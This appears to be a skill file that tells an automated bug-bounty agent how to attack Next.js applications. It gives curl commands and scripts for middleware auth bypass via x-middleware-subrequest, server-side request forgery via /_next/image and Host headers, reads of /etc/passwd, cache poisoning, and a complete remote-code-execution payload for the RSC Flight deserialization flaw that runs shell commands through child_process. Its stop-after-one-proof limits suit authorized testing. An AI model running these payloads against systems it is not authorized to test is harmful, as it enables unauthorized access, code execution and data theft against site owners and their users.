---
name: hunt-nextjs
description: Hunt Next.js specific vulnerabilities — x-middleware-subrequest auth bypass (CVE-2025-29927), first-level __nextLocale middleware bypass (CVE-2024-51479), RSC Flight deserialization RCE (CVE-2025-55182, Next.js advisory CVE-2025-66478), Server Actions auth bypass and Host-header SSRF (CVE-2024-34351), middleware matcher/path gaps, pages-router cache poisoning (CVE-2024-46982 / CVE-2025-32421 race bypass), Image Optimization SSRF (/_next/image), RSC flight-data leakage, source maps. Use when the target runs Next.js 11–16 or any React Server Components app.
sources: "cve_database (CVE-2024-34351 / GHSA-fr5h-rqp8-mj6g), Next.js advisories"
report_count: 0
---

# HUNT-NEXTJS — Next.js / SSR Framework Vulnerabilities

## Crown Jewel Targets

Next.js-specific bugs that bypass auth or reach SSRF = High/Critical.

**Highest-value chains:**
- **`x-middleware-subrequest` middleware bypass (CVE-2025-29927)** — a crafted `x-middleware-subrequest` header makes Next.js skip middleware entirely → all middleware-enforced auth/authz bypassed. Affects 11.1.4–15.2.2 (fixed 15.2.3 / 14.2.25 / 13.5.9 / 12.3.5). THE highest-value Next.js bug of 2025 — test it first on any middleware-gated route.
- **Server Actions auth bypass** — Server Actions enforce auth client-side only → call action ID directly → unauthorized data mutation or exfil
- **Middleware bypass via path/matcher gaps** — middleware `matcher` skips static/data paths → protected routes reachable via `/_next/data/` JSON or path-normalization tricks (IDOR)
- **`/_next/image` SSRF** — Image optimizer fetches attacker-controlled URL → internal network scan or cloud metadata
- **RSC Flight RCE (CVE-2025-55182 / CVE-2025-66478)** — unauthenticated crafted Flight payload to any App Router host. A safe detect request is not proof; one command marker is.
- **Pages-router cache poisoning (CVE-2024-46982)** — `__nextDataReq` + `x-now-route-matches` forces a non-dynamic SSR page into the cache. Not an App Router bug.
- **RSC payload leakage** — flight data contains server props the HTML does not (`RSC: 1`, `Next-Router-State-Tree`)

**Decision tree (adapts to any Next.js deployment):**
1. Fingerprint (Phase 1). App Router or `Vary: RSC` → Flight detect, then one proof (Phase 1b) before anything else.
2. Version in the CVE-2025-29927 window, or middleware you can see redirect to login → Phase 3, including the subrequest header. Patched 29927 does not retire matcher/path/locale gaps.
3. `Next-Action` ids in HTML/JS, or a POST the browser sends on a button → Phase 2.
4. `/_next/image` → Phase 4 (allowlist-aware).
5. `x-nextjs-cache` or a pages-router build → Phase 6. Use the CVE probe only on pages-router non-dynamic SSR; use the marker test everywhere else.
Run every branch that fingerprints positive — do not stop at the first.

---

## Attack Surface Signals

```
/_next/image?url=&w=&q=          Image optimizer — SSRF candidate
/_next/data/BUILD_ID/*.json      Prerendered page data — IDOR candidate
/__nextjs_original-stack-frame   Debug stack frame endpoint
/_next/static/chunks/            JS bundles — source map candidate
/api/                            API routes — standard hunt surface
__NEXT_DATA__ in HTML            SSR props leaked to client
x-nextjs-* response headers      Confirms Next.js
```

---

## Phase 1 — Fingerprint & Version Detection

```bash
# Confirm Next.js and get build ID
curl -s https://$TARGET/ | grep -oP '"buildId":"[^"]+"'
curl -sI https://$TARGET/ | grep -i "x-powered-by\|x-nextjs"

# Extract build ID for /_next/data/ paths
BUILD_ID=$(curl -s https://$TARGET/ | grep -oP '"buildId":"\K[^"]+')
echo "Build ID: $BUILD_ID"

# Check Next.js version via package disclosure
curl -s https://$TARGET/_next/static/chunks/framework*.js | grep -oP '"next":"[^"]+"'

# Source map exposure
curl -s "https://$TARGET/_next/static/chunks/pages/index.js.map" | head -5
curl -s "https://$TARGET/_next/static/chunks/main.js.map" | head -5
```

**Version → CVE map (check before hunting):**
| Version range | Key bug | Note |
|---|---|---|
| 11.1.4 – 15.2.2 | **CVE-2025-29927** middleware bypass via `x-middleware-subrequest` | Fixed 15.2.3 / 14.2.25 / 13.5.9 / 12.3.5. Self-hosted (`next start`, standalone) affected; some managed hosts (Vercel/Netlify) patched at the edge — test anyway |
| 13.4.0 – <14.1.1 | CVE-2024-34351 Server Actions SSRF (Host-trusting relative redirect) | Fixed 14.1.1; not `/_next/image`. Self-hosted; Host-routed platforms are a different bug |
| 13.5.1–13.5.6 and 14.0.0–14.2.9, **pages router**, non-dynamic SSR | CVE-2024-46982 cache poison via `?__nextDataReq=1` + `x-now-route-matches: 1` | Fixed 13.5.7 / 14.2.10. Does **not** affect the App Router |
| 9.5.5 – <14.2.15, self-hosted, **no i18n** | **CVE-2024-51479** first-level pathname middleware bypass | Only `/foo`, not `/` or `/foo/bar`. Vercel edge is not this bug. Probe `?__nextLocale=` |
| Pages router; 14.x <14.2.24 and 15.0.0–<15.1.6 | **CVE-2025-32421** cache race (46982 patch bypass) | Two concurrent requests (query vs header), not the same-request 46982 probe. Fixed 14.2.24 / 15.1.6 |
| Next 15 before 15.0.5 / 15.1.9 / 15.2.6 / 15.3.6 / 15.4.8 / 15.5.7; Next 16 before 16.0.7; 14.3.0-canary.77+; React `react-server-dom-*` 19.0.0, 19.1.0, 19.1.1, 19.2.0 | **CVE-2025-55182** Flight RCE (Next.js tracks it as CVE-2025-66478) | Default App Router, pre-auth. Detect ≠ proven. Edge WAFs patch some hosts while origin stays vulnerable |
Treat the map as a starting hypothesis — confirm the actual behavior, never report on version banner alone.

---

## Phase 1b — RSC Flight deserialization (CVE-2025-55182)

Any App Router route deserializes this before the action id is checked. `Next-Action: x` is enough. Do not send a hang/loop body (CVE-2025-55184, CVE-2025-67779, CVE-2026-23864 are DoS — out of rails).

```bash
# DETECTED, not RCE. Vulnerable Flight parser: HTTP 500, Content-Type: text/x-component,
# body contains E{"digest" . Patched parsers do not 500 on this colon reference.
curl -sD - -o /tmp/rsc-detect.txt -X POST "https://$TARGET/" \
  -H "Next-Action: x" \
  -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad" \
  --data-raw $'------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\nContent-Disposition: form-data; name="1"\r\n\r\n{}\r\n------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\nContent-Disposition: form-data; name="0"\r\n\r\n["$1:aa:aa"]\r\n------WebKitFormBoundaryx8jO2oVc6SWP3Sad--'
```

A random POST that 500s is not this signature. A 403 from a CDN is a filter, not a patch — repeat the detect against the origin when it is in scope.

```bash
# PROVEN — only after the detect signature. One echo. The marker must appear in the
# body or in Location / x-action-redirect. Then stop. No shell, no second command.
# If the header is stripped, change echo to: curl -s http://UNIQUE.collab/r2s-$MARK
export MARK="zqx$(date +%s)"
python3 << 'PY'
import os
mark = os.environ["MARK"]
prefix = (
    "var res=process.mainModule.require('child_process').execSync('echo %s').toString().trim();;"
    "throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});"
) % mark
part0 = (
    '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
    '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"%s",'
    '"_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
) % prefix
b = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
open("/tmp/rsc-proof.body", "w").write(
    f"--{b}\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n{part0}\r\n"
    f"--{b}\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n\"$@0\"\r\n"
    f"--{b}\r\nContent-Disposition: form-data; name=\"2\"\r\n\r\n[]\r\n"
    f"--{b}--"
)
PY
curl -sD /tmp/rsc-proof.hdr -o /tmp/rsc-proof.txt -X POST "https://$TARGET/" \
  -H "Next-Action: x" \
  -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad" \
  --data-binary @/tmp/rsc-proof.body
grep -a "$MARK" /tmp/rsc-proof.hdr /tmp/rsc-proof.txt
```

If the detect signature matched but `$MARK` is absent, retry **once** with
`process.getBuiltinModule('child_process')` in place of `process.mainModule.require('child_process')`
(ESM / `mainModule === null`). Still one echo, then stop.

Source in an action response that is not already in the client bundle is a separate, lower finding (CVE-2025-55183). Quote the server-only string. Do not call it RCE.

---

## Phase 2 — Server Actions Abuse

```bash
# Action ids are in the client bundle (40–42 hex, or an encrypted id) and in
# form field names $ACTION_ID_… . The header the browser sends is Next-Action, not x-action-id.
grep -RhoE '\$ACTION_ID_[A-Za-z0-9_]+|[a-f0-9]{40,42}' recon/$TARGET --include='*.js' | sort -u | head

# Direct call the browser uses for a button action: text/plain body, arguments as a JSON array.
curl -sD - -X POST "https://$TARGET/target-page" \
  -H "Next-Action: $ACTION_ID" \
  -H "Content-Type: text/plain;charset=UTF-8" \
  -H "Cookie: " \
  --data-binary '[]'

# Form actions are multipart. If text/plain says the action was not found, replay the
# browser's multipart once — do not invent a boundary of "----".
```

Auth bypass: the RSC response (or a **later GET**) shows a mutation or another user's marker, and the same call with no cookie differs from a logged-in baseline. A 500 stack is not a bypass.

Origin is checked against the host and `serverActions.allowedOrigins`. One request each: omit `Origin`, `Origin: null`, `Origin: https://$TARGET.evil.example`. The action's effect must still land. A CORS header is not the bug.

```bash
# CVE-2024-34351 — relative redirect trusts Host (self-hosted, versions in the table).
# Proof is a hit on UNIQUE.collab, not a 500.
curl -sD - -o /dev/null -X POST "https://$TARGET/target-page" \
  -H "Host: UNIQUE.collab" -H "Next-Action: $ACTION_ID" \
  -H "Content-Type: text/plain;charset=UTF-8" --data-binary '[]'
```

---

## Phase 3 — Middleware Auth Bypass

```bash
# === CVE-2025-29927: x-middleware-subrequest bypass (test this FIRST) ===
# The header value is a ":"-joined middleware path. Next tolerates repeats, so a
# long repeated value covers nested/renamed middleware. Try all known shapes:
BASE=$(curl -s -o /dev/null -w "%{http_code}" https://$TARGET/admin/dashboard)   # baseline (302/401/403 expected)
for V in \
  "middleware" \
  "src/middleware" \
  "middleware:middleware:middleware:middleware:middleware" \
  "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware" \
  "pages/_middleware" \
  "pages/_middleware:pages/_middleware:pages/_middleware:pages/_middleware:pages/_middleware"; do
  CODE=$(curl -s -o /tmp/mw -w "%{http_code}" https://$TARGET/admin/dashboard -H "x-middleware-subrequest: $V")
  echo "[$CODE] x-middleware-subrequest: $V"
done
# A protected route flipping from 302/401/403 (baseline) to 200 WITH authed content
# = confirmed auth bypass. Body-diff /tmp/mw vs a known-unauth response to prove it.

# Next.js middleware runs on edge runtime and may skip certain paths
# Test protected route directly
curl -s -o /dev/null -w "%{http_code}" https://$TARGET/admin/dashboard
# → 200 means accessible

# Test via /_next/data/ (SSG/ISR JSON) — middleware may not apply
curl -s "https://$TARGET/_next/data/$BUILD_ID/admin/dashboard.json"

# Test via static asset path prefix (middleware matcher may exclude /_next/static)
curl -s "https://$TARGET/_next/static/../admin/dashboard"

# Encoded path bypass
curl -s "https://$TARGET/%5Fnext/data/$BUILD_ID/admin/users.json"
curl -s "https://$TARGET/_next/data/$BUILD_ID/..%2Fadmin%2Fusers.json"

# Matcher gaps that survive the 29927 patch: locale or basePath prefix, trailing slash, case.
curl -s -o /dev/null -w "%{http_code}" "https://$TARGET/en/admin/dashboard"
curl -s -o /dev/null -w "%{http_code}" "https://$TARGET/admin/dashboard/"

# CVE-2024-51479 — first-level route only (/admin, not /admin/users). Self-hosted, no i18n.
# __nextLocale must NOT equal the path segment. Body-diff vs the middleware 302/401 baseline.
curl -s -o /tmp/nl -w "%{http_code}" "https://$TARGET/admin?__nextLocale=anything"
```

---

## Phase 4 — Image Optimization SSRF (`/_next/image`)

```bash
# OOB first — unique subdomain. A 400 is the default allowlist rejection, not a bypass.
COLLAB="http://UNIQUE.COLLAB_HOST"
curl -s "https://$TARGET/_next/image?url=$COLLAB/nextjs-ssrf&w=64&q=75"
# DNS/HTTP on that exact host = the optimizer fetched. Only then try an internal URL once
# (follow hunt-ssrf; IMDSv2 401 is not keys). Do not lead with 169.254.169.254.
curl -s "https://$TARGET/_next/image?url=http://127.0.0.1:6379/&w=64&q=75"
curl -s "https://$TARGET/_next/image?url=file:///etc/passwd&w=64&q=75"
```

**FALSE-POSITIVE GUARD (read before claiming SSRF):** `/_next/image` only
fetches URLs allowed by `images.remotePatterns` / `images.domains` in
`next.config.js`. A non-whitelisted `url` returns **400 by default** — that is
the optimizer's normal allowlist rejection, NOT a "block" you bypassed. A **200**
returns an *optimized image*, not the upstream response body, so a status code
alone NEVER confirms SSRF. Confirm only via an **out-of-band callback to a unique
Collaborator subdomain** (above), or by body-diffing a known-internal vs
known-external target. Do not report on status code. If `remotePatterns` allows a host you can place an open redirect or a DNS-rebinding name on, point `url` at that hop once — the callback must still be from the optimizer. SVG from an allowed host is XSS only when a browser executes it off `/_next/image` (`dangerouslyAllowSVG`).

> Note: CVE-2024-34351 (Next.js SSRF, GHSA-fr5h-rqp8-mj6g, affects 13.4.0
> through < 14.1.1, fixed in 14.1.1) is a **Server Actions** SSRF — a relative
> redirect that trusts the `Host` header — NOT a `/_next/image` bug, and it does
> NOT affect Host-routed providers like Vercel. See Phase 2 for the Server
> Actions surface.

---

## Phase 5 — `/_next/data/` IDOR & Data Leakage

```bash
# Enumerate prerendered JSON for user-specific data
# Pattern: /_next/data/BUILD_ID/[page].json or /_next/data/BUILD_ID/[dynamic]/[id].json
curl -s "https://$TARGET/_next/data/$BUILD_ID/profile.json" \
  -H "Cookie: session=$B_SESSION"   # second test account you own — never a real victim's

# Other-user JSON: use account B's real id (from a session you own), not a numeric walk.
curl -s "https://$TARGET/_next/data/$BUILD_ID/users/$B_ID.json" | grep -F "$B_MARKER"

# App Router flight (the pages-router __NEXT_DATA__ block is not this response)
curl -s "https://$TARGET/dashboard" -H "RSC: 1" -H "Next-Url: /dashboard"
curl -s "https://$TARGET/dashboard" -H "Accept: text/x-component" -H "RSC: 1" -H "Next-Router-Prefetch: 1"

# Check __NEXT_DATA__ in HTML for sensitive server-side props
curl -s "https://$TARGET/dashboard" | \
  python3 -c "import sys,re,json; m=re.search(r'<script id=\"__NEXT_DATA__\"[^>]*>(.*?)</script>',sys.stdin.read(),re.S); print(json.dumps(json.loads(m.group(1)),indent=2) if m else 'not found')"
```

---

## Phase 6 — Cache poisoning

Generic marker test (any router). One path, one marker, stop. Do not cache an error page for other users.

```bash
MARK="zqx$(date +%s)"
curl -s "https://$TARGET/blog/test-post?preview=$MARK" -o /dev/null
# Second client, clean URL. Marker + x-nextjs-cache/age = poisoned. Marker only on the
# request that sent it = reflection.
curl -si "https://$TARGET/blog/test-post" | grep -iE "$MARK|x-nextjs-cache|age:"
```

CVE-2024-46982 (pages router, non-dynamic SSR, versions in the table — not App Router):

```bash
curl -s "https://$TARGET/dashboard?__nextDataReq=1" -H "x-now-route-matches: 1" \
  -H "User-Agent: $MARK" -o /dev/null
curl -s "https://$TARGET/dashboard" -A "clean-client" | grep "$MARK"
```

Second client must see `$MARK`. `Cache-Control: s-maxage=1, stale-while-revalidate` on a route that was dynamic is the framework signal; it is not the finding without the second response.

CVE-2025-32421 (pages router, 46982 patch bypass): same-request probe above is **not** this bug. Race two different requests in one last-byte-sync batch (`hunt-race-condition`) — one with `?__nextDataRequest=1`, one with `x-now-route-matches: 1` + `$MARK` in a cacheable header/UA. Second clean client must still see `$MARK`. One batch, stop.

```bash
# Revalidate / draft-mode secret: only a value already in a bundle or __NEXT_DATA__. Do not guess.
curl -s "https://$TARGET/api/revalidate?secret=$LEAKED&path=/blog/test"
curl -s "https://$TARGET/blog/unpublished-slug" -H "Cookie: __prerender_bypass=$LEAKED"
```
Unpublished body that a clean client cannot read is the draft-mode finding. A 404 is not a bypass.

---

## Phase 7 — Debug & Stack Frame Endpoints

**Precondition:** `__nextjs_launch-editor` and `__nextjs_original-stack-frame`
are react-dev-overlay middleware mounted ONLY under `next dev`. A production
build (`next build && next start`) does not register these routes — a 404 here
is the normal, expected result, not a "filter" you need to bypass. They are
reachable ONLY in the rare misconfiguration of literally running `next dev` in
production. Treat any non-404 as the real finding; do NOT report a 404/filtered
response as confirmation.

```bash
# First confirm dev mode is actually exposed (anything but 404 = dev server in prod)
curl -s -o /dev/null -w "%{http_code}" \
  "https://$TARGET/__nextjs_original-stack-frame?isServer=true&errorMessage=test"

# Only if the above is NOT 404: the launch-editor / stack-frame endpoints can
# reference local files (file-read surface of a dev server wrongly exposed)
curl -s "https://$TARGET/__nextjs_launch-editor?file=../../etc/passwd&line=1"
curl -s "https://$TARGET/__nextjs_original-stack-frame" \
  --data '{"file":"/etc/passwd","line":1,"column":1}'
```

---

## Phase 8 — Environment Variable Leakage

```bash
# NEXT_PUBLIC_* vars are baked into JS bundles — grep for secrets
curl -s "https://$TARGET/_next/static/chunks/pages/_app.js" | \
  grep -oE "NEXT_PUBLIC_[A-Z_]+['\"]?\s*[:=]\s*['\"]?[^'\"&\s]+"

# Check for non-public vars accidentally exposed
curl -s https://$TARGET/ | python3 -c "
import sys, re, json
m = re.search(r'__NEXT_DATA__.*?({.*?})</script>', sys.stdin.read(), re.S)
if m:
    d = json.loads(m.group(1))
    print(json.dumps(d.get('props', {}), indent=2))
"
```

---

## Chain Table

| Next.js finding | Chain to | Impact |
|----------------|----------|--------|
| Flight RCE (CVE-2025-55182) | Marker or one OOB from the Node process | Critical. Detect-only 500 is not this row |
| `x-middleware-subrequest` bypass (CVE-2025-29927) | Reach every middleware-gated route unauth → admin panels, internal APIs, auth gates | Critical auth bypass |
| Server Action no auth | Call privileged mutations directly | Data manipulation / admin access |
| `/_next/image` SSRF | Cloud metadata → IAM creds | Cloud compromise |
| `/_next/data/` IDOR | Other users' server-side props | PII / token exfil |
| Middleware bypass | Protected admin routes | Auth bypass |
| Source map exposed | Reconstruct TS source → find hardcoded secrets | Further vulns |
| `__NEXT_DATA__` leaks | Server-side secrets in HTML | API keys / tokens |

---

## Validation

✅ Flight RCE: detect signature first, then `$MARK` or one unique-host callback in the proof response. The detect 500 alone is **detected**, not a finding to file as RCE
✅ Middleware subrequest bypass: protected route returns authenticated content (body-diff vs unauth) only when the header is present
✅ CVE-2024-51479: first-level route (`/admin` not `/admin/x`) returns that same authed body with `?__nextLocale=` and without the subrequest header
✅ Server Action: a later GET shows the mutation, or the RSC body contains data the logged-out baseline does not
✅ SSRF: DNS/HTTP callback from `/_next/image` or from the Host-header action redirect, unique subdomain
✅ Cache: a second client receives the marker on the clean URL
✅ Data leak: `__NEXT_DATA__` or an `RSC: 1` body contains a non-public secret or another user's marker

**Severity:**
- Flight RCE with command output or OOB: Critical. Detect-only: do not submit
- `x-middleware-subrequest` bypass reaching admin/internal: Critical
- Server Action auth bypass → data mutation: High/Critical
- Image SSRF → cloud metadata: Critical (callback first; metadata only after `hunt-ssrf`)
- Middleware matcher bypass → admin panel: High
- CVE-2025-55183 source in the action body: Medium, quote the source
- Source map exposure only: Low-Medium

## Before you report — dedup gate

Fresh/changed surface first (see `dedup-novelty`, `changed-js-deepdive`), and hunt classes in yield
order (`/yield`). Before drafting ANY finding from this skill, run the dedup gate:

```bash
python3 engine/dedup.py check --program <program> --class <class> --url "<endpoint>" --title "<title>"
```

`NOVEL` -> proceed to `/validate`. `LIKELY_DUP` -> stop unless you can prove a concrete differentiator
(different endpoint/param/impact, or a bypass of the deployed fix -> report as a regression).
